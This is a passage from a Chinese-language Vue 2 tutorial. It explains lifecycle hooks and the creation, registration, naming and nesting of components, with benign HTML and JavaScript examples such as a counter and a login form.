<font style="color:#595959;">            // this.users.reverse()</font>

<font style="color:#595959;">            console.log(this.users);</font>

<font style="color:#595959;">          }</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>



**《2.16、vue的生命周期》**

所谓的生命周期是指：一个事物从出生到最终的死亡，整个经历的过程叫做生命周期。

例如人的生命周期：

(1) 出生：打疫苗

(2) 3岁了：上幼儿园

(3) 6岁了：上小学

(4) 12岁了：上初中

(5) ......

(6) 58岁了：退休

(7) ......

(8) 临终：遗嘱

(9) 死亡：火化

可以看到，在这个<font style="color:#FF0000;">生命线</font>上有很多不同的时间节点，在<font style="color:#FF0000;">不同的时间节点</font>上去<font style="color:#FF0000;">做不同的事儿</font>。

Vue的生命周期指的是：vm对象从**创建到最终销毁**的整个过程。

(1) 虚拟DOM在内存中就绪时：去调用一个a函数

(2) 虚拟DOM转换成真实DOM渲染到页面时：去调用一个b函数

(3) Vue的data发生改变时：去调用一个c函数

(4) ......

(5) Vue实例被销毁时：去调用一个x函数

在生命线上的函数叫做<font style="color:#FF0000;">钩子函数</font>，这些函数是不需要程序员手动调用的，由Vue自动调用，程序员只需要按照自己的需求写上，<u>到了那个时间点自动就会执行</u>。

### 2.16.2 掌握Vue的生命周期有什么用 
研究Vue的生命周期主要是研究：在不同的时刻Vue做了哪些不同的事儿。

例如：在vm被销毁之前，需要将绑定到元素上的自定义事件全部解绑，

那么这个解绑的代码就需要找一个地方写一下，写到哪里呢？你可以写到beforeDestroy()这个函数中，这个函数会被Vue自动调用，而且是在vm对象销毁前被自动调用。

**像这种在不同时刻被自动调用的函数称为钩子函数。每一个钩子函数都有对应的调用时间节点**。

换句话说，研究Vue的生命周期主要研究的核心是：在<font style="color:#FF0000;">哪个时刻</font>调用了<font style="color:#FF0000;">哪个钩子函数</font>。

### 2.16.3 Vue生命周期的4个阶段8个钩子 
Vue的生命周期可以被划分为4个阶段：初始阶段、挂载阶段、更新阶段、销毁阶段。

每个阶段会调用两个钩子函数。两个钩子函数名的特点：beforeXxx()、xxxed()。

8个生命周期钩子函数分别是：

(1) 初始阶段

<font style="color:#DF2A3F;">① beforeCreate() 创建前</font>

<font style="color:#DF2A3F;">② created() 创建后</font>

(2) 挂载阶段

① beforeMount() 挂载前

<font style="color:#DF2A3F;">② mounted() 挂载后</font>

(3) 更新阶段

① beforeUpdate() 更新前

② updated() 更新后

(4) 销毁阶段

<font style="color:#DF2A3F;">① beforeDestroy() 销毁前</font>

② destroyed() 销毁后

<font style="color:#FF0000;">8个钩子函数写在哪里？直接写在Vue构造函数的options对象当中。</font>

Vue官方的生命周期图：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433647190-b632d452-a53a-46ae-9aa2-ca079623438d.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433647504-c8d43100-956f-48a1-8b79-4d9cd7b131eb.png)

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <h3>计数器：{{counter}}</h3></font>

<font style="color:#595959;">      <button @click="add">点我加1</button></font>



<font style="color:#595959;">      <h3 v-text="counter"></h3></font>

<font style="color:#595959;">      <button @click="destroy">点我销毁</button></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Vue生命周期",</font>

<font style="color:#595959;">          counter: 1,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          add() {</font>

<font style="color:#595959;">            console.log("add....");</font>

<font style="color:#595959;">            this.counter++;</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          destroy() {</font>

<font style="color:#595959;">            // 销毁vm</font>

<font style="color:#595959;">            this.$destroy();</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        watch: {</font>

<font style="color:#595959;">          counter() {</font>

<font style="color:#595959;">            console.log("counter被监视一次！");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        /*</font>

<font style="color:#595959;">            1.初始阶段</font>

<font style="color:#595959;">                el有，template也有，最终编译template模板语句。</font>

<font style="color:#595959;">                el有，template没有，最终编译el模板语句。</font>

<font style="color:#595959;">                el没有的时候，需要手动调用 vm.$mount(el) 进行手动挂载，然后流程才能继续。</font>

<font style="color:#595959;">                    此时如果template有，最终编译template模板语句。</font>

<font style="color:#595959;">                el没有的时候，需要手动调用 vm.$mount(el) 进行手动挂载，然后流程才能继续。</font>

<font style="color:#595959;">                    此时如果没有template，最终编译el模板语句。</font>



<font style="color:#595959;">                结论：</font>

<font style="color:#595959;">                   </font>**<font style="color:#595959;"> 流程要想继续：el必须存在。</font>**

**<font style="color:#595959;">                    el和template同时存在，优先选择template。如果没有template，才会选择el。</font>**

<font style="color:#595959;">            */</font>

<font style="color:#595959;">        beforeCreate() {</font>

<font style="color:#595959;">          // 创建前</font>

<font style="color:#595959;">          // 创建前指的是：数据代理和数据监测的创建前。</font>

<font style="color:#595959;">          // 此时还无法访问data当中的数据。包括methods也是无法访问的。</font>

<font style="color:#595959;">          console.log("beforeCreate", this.counter);</font>

<font style="color:#595959;">          // 调用methods报错了，不存在。</font>

<font style="color:#595959;">          //this.add()</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        created() {</font>

<font style="color:#595959;">          // 创建后</font>

<font style="color:#595959;">          // 创建后表示数据代理和数据监测创建完毕，可以访问data中的数据了。</font>

<font style="color:#595959;">          console.log("created", this.counter);</font>

<font style="color:#595959;">          // 可以访问methods了。</font>

<font style="color:#595959;">          //this.add()</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 2.挂载阶段</font>

<font style="color:#595959;">        beforeMount() {</font>

<font style="color:#595959;">          // 挂载前</font>

<font style="color:#595959;">          console.log("beforeMount");</font>

<font style="color:#595959;">          //   debugger  //断点</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        mounted() {</font>

<font style="color:#595959;">          // 挂载后</font>

<font style="color:#595959;">          console.log("mounted");</font>

<font style="color:#595959;">          // 创建真实dom元素</font>

<font style="color:#595959;">          console.log(this.$el);</font>

<font style="color:#595959;">          console.log(this.$el instanceof HTMLElement);</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 3.更新阶段</font>

<font style="color:#595959;">        beforeUpdate() {</font>

<font style="color:#595959;">          // 更新前</font>

<font style="color:#595959;">          console.log("beforeUpdate");</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        updated() {</font>

<font style="color:#595959;">          // 更新后</font>

<font style="color:#595959;">          console.log("updated");</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 4.销毁阶段</font>

<font style="color:#595959;">        beforeDestroy() {</font>

<font style="color:#595959;">          // 销毁前，解绑vue</font>

<font style="color:#595959;">          console.log("beforeDestroy");</font>

<font style="color:#595959;">          console.log(this);</font>

<font style="color:#595959;">          this.counter = 1000;</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        destroyed() {</font>

<font style="color:#595959;">          // 销毁后，vm依然存在，不过是vm身上的事件，监听解绑</font>

<font style="color:#595959;">          console.log("destroyed");</font>

<font style="color:#595959;">          console.log(this);</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.16.4 初始阶段做了什么事儿 
做了这么几件事：

(1) 创建Vue实例vm（此时Vue实例已经完成了创建，这是生命的起点）

(2) 初始化事件对象和生命周期（接产大夫正在给他洗澡）

(3) 调用<font style="color:#FF0000;">beforeCreate</font>()钩子函数（此时还无法通过vm去访问data对象的属性）

(4) 初始化数据代理和数据监测

(5) 调用<font style="color:#FF0000;">created</font>()钩子函数（此时数据代理和数据监测创建完毕，已经可以通过vm访问data对象的属性）

(6) 编译模板语句生成虚拟DOM（此时虚拟DOM已经生成，但页面上还没有渲染）

该阶段适合做什么？

**<font style="color:#FF0000;">beforeCreate：可以在此时加一些loading效果，自定义一些属性放到this身上，好比全局事件总线</font>**

**<font style="color:#FF0000;">created：结束loading效果。也可以在此时发送一些网络请求，获取数据。也可以在这里添加定时器。</font>**

### 2.16.5 挂载阶段做了什么事儿 
做了这么几件事：

(1) 调用<font style="color:#FF0000;">beforeMount</font>()钩子函数（此时页面还未渲染，真实DOM还未生成，此时操作数据，不会最终显示在页面中）

(2) 给vm追加$el属性，用它来代替”el”，$el代表了真实的DOM元素（此时真实DOM生成，页面渲染完成）

(3) 调用<font style="color:#FF0000;">mounted</font>()钩子函数

该阶段适合做什么？

**<font style="color:#FF0000;">mounted：可以操作页面的DOM元素了。也有人喜欢在这个阶段请求数据</font>**

面试题：请求数据是在哪个钩子里，原因是什么？

### 2.16.6 更新阶段做了什么事儿 
(1) data发生变化（这是该阶段开始的标志）

(2) 调用<font style="color:#FF0000;">beforeUpdate</font>()钩子函数（此时只是内存中的数据发生变化，页面还未更新）

(3) 虚拟DOM重新渲染和修补

(4) 调用<font style="color:#FF0000;">updated</font>()钩子函数（此时页面已更新）

该阶段适合做什么？

**<font style="color:#FF0000;">beforeUpdate：适合在更新之前访问现有的 DOM，比如手动移除已添加的事件监听器。</font>**

**<font style="color:#FF0000;">updated：页面更新后，如果想对数据做统一处理，可以在这里完成。</font>**

### 2.16.7 销毁阶段做了什么事儿 
做了这么几件事：

(1) vm.$destroy()方法被调用（这是该阶段开始的标志）

(2) 调用<font style="color:#FF0000;">beforeDestroy</font>()钩子函数（此时Vue实例还在。虽然vm上的监视器、vm上的子组件、vm上的自定义事件监听器还在，但是它们都已经不能用了。此时修改data也不会重新渲染页面了）

(3) 卸载子组件和监视器、解绑自定义事件监听器

(4) 调用<font style="color:#FF0000;">destroyed</font>()钩子函数（虽然destroyed翻译为已销毁，但此时Vue实例还在，空间并没有释放，只不过马上要释放了，这里的已销毁指的是vm对象上所有的东西都已经解绑完成了）

该阶段适合做什么？

**<font style="color:#FF0000;">beforeDestroy：适合做销毁前的准备工作，和人临终前写遗嘱类似。例如：可以在这里清除定时器,解绑自定义事件，解除监听等</font>**



## 《3.1、组件的使用》
## 3.1、什么是组件
### 3.1.1、传统方式开发的应用
一个网页通常包括三部分：结构（HTML）、样式（CSS）、交互（JavaScript）

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433647775-2ee8d593-d58a-4e96-8d23-e1d16f91966b.png)

### 3.1.2、组件化方式开发的应用
使用组件化方式开发解决了以上的两个问题：

① 每一个组件都有独立的js，独立的css，这些独立的js和css只供当前组件使用，不存在纵横交错。更加便于维护。

② 代码复用性增强。组件不仅让js css复用了，HTML代码片段也复用了（因为要使用组件直接引入组件即可）。

### <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433648082-59cb0de8-d729-4fec-9772-d492a410a474.png)3.1.3、什么是组件？
① 组件：**<font style="color:#FF0000;">实现应用中局部功能的代码和资源的集合</font>**。凡是采用组件方式开发的应用都可以称为组件化应用。

② 模块：一个大的js文件按照模块化拆分规则进行拆分，生成多个js文件，每一个js文件叫做模块。凡是采用模块方式开发的应用都可以称为模块化应用。

③ 任何一个组件中都可以包含这些资源：HTML CSS JS 图片 声音 视频等。从这个角度也可以说明组件是可以包括模块的。

### 3.1.4、组件的划分粒度很重要
粒度太粗会影响复用性。为了让复用性更强，Vue的组件也支持父子组件嵌套使用。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433648369-879f9cc2-3fea-4c16-9696-98eb0c41b039.png)

子组件由父组件来管理，父组件由父组件的父组件管理。在Vue中根组件就是vm。因此每一个组件也是一个Vue实例。

## 3.2、组件的创建，注册，使用
### 3.2.1、组件的创建、注册、局部使用
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433648646-163dffd1-528f-4dbb-b5c3-42d3791b97c2.png)

第一步：创建组件

**Vue.extend({该配置项和new Vue的配置项几乎相同，略有差别})**



区别有哪些？

**1. 创建Vue组件的时候，配置项中不能使用el配置项。**

**因为组件具有通用性，不特定为某个容器服务，它为所有容器服务**

**2. 配置项中的data不能使用直接对象的形式，必须使用function**

**以保证数据之间不会相互影响**

**3、使用template配置项来配置模板语句:HTML结构**



第二步：注册组件

局部注册：

在配置项当中使用components，语法格式：

**<font style="color:#FF0000;">components : {</font>**

**<font style="color:#FF0000;">组件的名字 : 组件对象</font>**

**<font style="color:#FF0000;">}</font>**

全局注册：



第三步：使用组件

1、**<font style="color:#FF0000;">直接在页面中写<组件的名字></组件的名字></font>**

2、也可以使用单标签<组件的名字 />

这种方式一般在脚手架中使用，否则会有元素不渲染的问题

<font style="color:#595959;"><body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 3. 使用组件 --></font>

<font style="color:#595959;">      <userlist></userlist></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 1.创建组件(结构HTML 交互JS 样式CSS)</font>

<font style="color:#595959;">      const myComponent = Vue.extend({</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">            <ul></font>

<font style="color:#595959;">                <li v-for="(user,index) of users" :key="user.id"></font>

<font style="color:#595959;">                    {{index}},{{user.name}}</font>

<font style="color:#595959;">                </li></font>

<font style="color:#595959;">            </ul></font>

<font style="color:#595959;">            `,</font>

<font style="color:#595959;">        data() {</font>

<font style="color:#595959;">          return {</font>

<font style="color:#595959;">            users: [</font>

<font style="color:#595959;">              { id: "001", name: "jack" },</font>

<font style="color:#595959;">              { id: "002", name: "lucy" },</font>

<font style="color:#595959;">              { id: "003", name: "james" },</font>

<font style="color:#595959;">            ],</font>

<font style="color:#595959;">          };</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      // Vue实例</font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "第一个组件",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 2. 注册组件（局部注册）</font>

<font style="color:#595959;">        components: {</font>

<font style="color:#595959;">          // userlist是组件的名字。myComponent只是一个变量名。</font>

<font style="color:#595959;">          userlist: myComponent,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 3.2.2、为什么组件中data数据要使用函数形式
面试题：为什么组件中data数据要使用函数形式

<font style="color:#595959;"> <script></font>

<font style="color:#595959;">      // 数据只有一份，数据会互相影响</font>

<font style="color:#595959;">      let dataobj = {</font>

<font style="color:#595959;">        counter: 1,</font>

<font style="color:#595959;">      };</font>

<font style="color:#595959;">      let a = dataobj;</font>

<font style="color:#595959;">      let b = dataobj;</font>



<font style="color:#595959;">      function datafun() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">          counter: 1,</font>

<font style="color:#595959;">        };</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">      // </font>**<font style="color:#FF0000;">只要运行一次函数，就会创建一个全新的数据，互不影响</font>**

<font style="color:#595959;">      let x = datafun();</font>

<font style="color:#595959;">      let y = datafun();</font>

<font style="color:#595959;">    </script></font>

### 3.2.3、创建组件对象的简写方式
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433648855-14a4238d-150d-480a-9924-6f305b59ba9a.png)

创建组件对象也有简写形式：Vue.extend() 可以省略。直接写：{}

<font style="color:#595959;"> <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 3. 使用组件 --></font>

<font style="color:#595959;">      <userlogin></userlogin></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 1. 创建组件</font>

<font style="color:#595959;">      /* const userLoginComponent = Vue.extend({</font>

<font style="color:#595959;">            template : `</font>

<font style="color:#595959;">            <div></font>

<font style="color:#595959;">                <h3>用户登录</h3></font>

<font style="color:#595959;">                <form @submit.prevent="login"></font>

<font style="color:#595959;">                    账号：<input type="text" v-model="username"> <br><br></font>

<font style="color:#595959;">                    密码：<input type="password" v-model="password"> <br><br></font>

<font style="color:#595959;">                    <button>登录</button></font>

<font style="color:#595959;">                </form></font>

<font style="color:#595959;">            </div></font>

<font style="color:#595959;">            `,</font>

<font style="color:#595959;">            data(){</font>

<font style="color:#595959;">                return {</font>

<font style="color:#595959;">                    username : '',</font>

<font style="color:#595959;">                    password : ''</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">            methods: {</font>

<font style="color:#595959;">                login(){</font>

<font style="color:#595959;">                    alert(this.username + "," + this.password)</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">        }) */</font>

<font style="color:#595959;">      // </font>**<font style="color:#FF0000;">底层会在局部或全局注册组件时，自动调用Vue.extend()</font>**

<font style="color:#595959;">      const userLoginComponent = {</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">            <div></font>

<font style="color:#595959;">                <h3>用户登录</h3></font>

<font style="color:#595959;">                <form @submit.prevent="login"></font>

<font style="color:#595959;">                    账号：<input type="text" v-model="username"> <br><br></font>

<font style="color:#595959;">                    密码：<input type="password" v-model="password"> <br><br></font>

<font style="color:#595959;">                    <button>登录</button></font>

<font style="color:#595959;">                </form></font>

<font style="color:#595959;">            </div></font>

<font style="color:#595959;">            `,</font>

<font style="color:#595959;">        data() {</font>

<font style="color:#595959;">          return {</font>

<font style="color:#595959;">            username: "",</font>

<font style="color:#595959;">            password: "",</font>

<font style="color:#595959;">          };</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          login() {</font>

<font style="color:#595959;">            alert(this.username + "," + this.password);</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      };</font>



<font style="color:#595959;">      // Vue实例</font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "第二个用户登录组件",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 2. 注册组件（局部注册）</font>

<font style="color:#595959;">        components: {</font>

<font style="color:#595959;">          userlogin: userLoginComponent,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 3.2.4、组件的全局注册
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433649145-c094acda-51a8-41ba-bb69-b65f7265fa6a.png)

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- </font>

**<font style="color:#FF0000;">        组件的使用分为三步：</font>**

**<font style="color:#FF0000;">            第一步：创建组件</font>**

**<font style="color:#FF0000;">                Vue.extend({该配置项和new Vue的配置项几乎相同，略有差别})。</font>**

**<font style="color:#FF0000;">            第二步：注册组件</font>**

**<font style="color:#FF0000;">                局部注册：</font>**

**<font style="color:#FF0000;">                    在配置项当中使用components，语法格式：</font>**

**<font style="color:#FF0000;">                        components : {</font>**

**<font style="color:#FF0000;">                            组件的名字 : 组件对象</font>**

**<font style="color:#FF0000;">                        }</font>**

**<font style="color:#FF0000;">                全局注册：</font>**

**<font style="color:#FF0000;">                    Vue.component('组件的名字', 组件对象)</font>**

**<font style="color:#FF0000;">            第三步：使用组件 </font>**

<font style="color:#595959;">      --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 3. 使用组件 --></font>

<font style="color:#595959;">      <userlogin></userlogin></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <hr /></font>



<font style="color:#595959;">    <div id="app2"></font>

<font style="color:#595959;">      <userlogin></userlogin></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const userLoginComponent = {</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">            <div></font>

<font style="color:#595959;">                <h3>用户登录</h3></font>

<font style="color:#595959;">                <form @submit.prevent="login"></font>

<font style="color:#595959;">                    账号：<input type="text" v-model="username"> <br><br></font>

<font style="color:#595959;">                    密码：<input type="password" v-model="password"> <br><br></font>

<font style="color:#595959;">                    <button>登录</button></font>

<font style="color:#595959;">                </form></font>

<font style="color:#595959;">            </div></font>

<font style="color:#595959;">            `,</font>

<font style="color:#595959;">        data() {</font>

<font style="color:#595959;">          return {</font>

<font style="color:#595959;">            username: "",</font>

<font style="color:#595959;">            password: "",</font>

<font style="color:#595959;">          };</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          login() {</font>

<font style="color:#595959;">            alert(this.username + "," + this.password);</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      };</font>



<font style="color:#595959;">      // 全局注册</font>

<font style="color:#595959;">      Vue.component("userlogin", userLoginComponent);</font>



<font style="color:#595959;">      // 第2个vue实例</font>

<font style="color:#595959;">      const vm2 = new Vue({</font>

<font style="color:#595959;">        el: "#app2",</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      // Vue实例</font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "全局注册组件",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 注册组件（局部注册）</font>

<font style="color:#595959;">        // components: {</font>

<font style="color:#595959;">        //   userlogin : userLoginComponent</font>

<font style="color:#595959;">        // },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 3.2.5、组件的命名细节
注册组件细节：

1. 在Vue当中是可以使用自闭合标签的，如果组件需要多次使用，前提必须在脚手架环境中使用。

2. 在创建组件的时候Vue.extend()可以省略，但是底层实际上还是会调用的，在注册组件的时候会调用。

3. 组件的名字

（1）：全部小写

（2）：首字母大写，后面都是小写

（3）：kebab-case命名法（串式命名法。例如：user-login）

（4）：CamelCase命名法（驼峰式命名法。例如：UserLogin），

但是这种方式只允许在<font style="color:#F33232;">脚手架环境中</font>使用。

（5）不要使用HTML内置的标签名作为组件的名字。例如：header,main,footer

（6）在创建组件的时候，通过配置项配置一个name，这个name不是组件的名字， 是设置Vue开发者工具中显示的组件的名字。

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 3. 使用组件 --></font>

<font style="color:#595959;">      <hello-world></hello-world></font>

<font style="color:#595959;">      <hello-world /></font>

<font style="color:#595959;">      <!-- 使用多个的时候，会报错 --></font>

<font style="color:#595959;">      <!-- <hello-world /></font>

<font style="color:#595959;">      <hello-world /> --></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 1、创建组件</font>

<font style="color:#595959;">      // const hello = {</font>

<font style="color:#595959;">      //   template: `<h1> helloworld </h1>`,</font>

<font style="color:#595959;">      // };</font>

<font style="color:#595959;">      // 2、全局注册组件</font>

<font style="color:#595959;">      // Vue.component("hello-world", hello);</font>



<font style="color:#595959;">      // 注册的时候，同时创建组件</font>

<font style="color:#595959;">      Vue.component("hello-world", {</font>

<font style="color:#595959;">        name: "hw",</font>

<font style="color:#595959;">        template: `<h1> HelloWorld </h1>`,</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      // Vue实例</font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "组件注册注意点",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

## 3.3、组件的嵌套
哪里要使用，就到哪里去注册，去使用

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433649369-48df6f9d-33be-4bd6-a208-0ec566cbe548.png)

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>组件嵌套</title></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="root"></font>

<font style="color:#595959;">      <app></app></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      //4创建child组件</font>

<font style="color:#595959;">      const child = {</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">         <h3>child组件</h3></font>

<font style="color:#595959;">        `,</font>

<font style="color:#595959;">      };</font>



<font style="color:#595959;">      //3创建girl组件</font>

<font style="color:#595959;">      const girl = {</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">         <h2>girl组件</h2></font>

<font style="color:#595959;">        `,</font>

<font style="color:#595959;">      };</font>



<font style="color:#595959;">      //2 创建son组件</font>

<font style="color:#595959;">      const son = {</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">       <div></font>

<font style="color:#595959;">          <h2>son组件</h2></font>

<font style="color:#595959;">           <child /></font>

<font style="color:#595959;">        </div></font>

<font style="color:#595959;">        `,</font>

<font style="color:#595959;">        components: {</font>

<font style="color:#595959;">          child,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      };</font>



<font style="color:#595959;">      //1、创建app组件，并注册son组件和girl组件</font>

<font style="color:#595959;">      const app = {</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">         <div></font>

<font style="color:#595959;">           <h1>app组件</h1></font>

<font style="color:#595959;">           <girl /></font>

<font style="color:#595959;">           <son /></font>

<font style="color:#595959;">          </div></font>

<font style="color:#595959;">        `,</font>

<font style="color:#595959;">        components: {</font>

<font style="color:#595959;">          girl,</font>

<font style="color:#595959;">          son,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      };</font>

<font style="color:#595959;">      // 创建vm，并注册app组件</font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#root",</font>

<font style="color:#595959;">        // 1.3 使用app组件</font>

<font style="color:#595959;">        //1.2、 注册app组件</font>

<font style="color:#595959;">        components: {</font>

<font style="color:#595959;">          app,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

## 3.4、VueComponent & Vue
### 3.4.1、 this
**new Vue({})配置项中的this就是：Vue实例（****<font style="color:#FF0000;">vm)</font>**

**Vue.extend({})配置项中的this就是：VueComponent实例（****<font style="color:#FF0000;">vc</font>****）**

打开vm和vc你会发现，它们拥有大量相同的属性。例如：生命周期钩子、methods、watch等。 

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <user></user></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 创建组件</font>

<font style="color:#595959;">      const user = Vue.extend({</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">            <div></font>

<font style="color:#595959;">                <h1>user组件</h1></font>

<font style="color:#595959;">            </div></font>

<font style="color:#595959;">            `,</font>

<font style="color:#595959;">        mounted() {</font>

<font style="color:#595959;">          // user是什么呢？？？？</font>**<font style="color:#FF0000;">是一个全新的构造函数 VueComponent构造函数。</font>**

<font style="color:#595959;">          // this是VueComponent实例</font>

<font style="color:#595959;">          console.log('vc', this)</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      // vm</font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "vm与vc",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        components: {</font>

<font style="color:#595959;">          user,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        mounted() {</font>

<font style="color:#595959;">          // this是Vue实例</font>

<font style="color:#595959;">          console.log("vm", this);</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 3.4.2、 vm === vc ??? 
**只能说差不多一样，不是完全相等。**

**例如：**

**vm上有el，vc上没有。**

**另外data也是不一样的。vc的data必须是一个函数。**

**只能这么说：vm上有的vc上不一定有，vc上有的vm上一定有。**

### 3.4.3 通过vc可以访问Vue原型对象上的属性 
通过vc可以访问Vue原型对象上的属性：

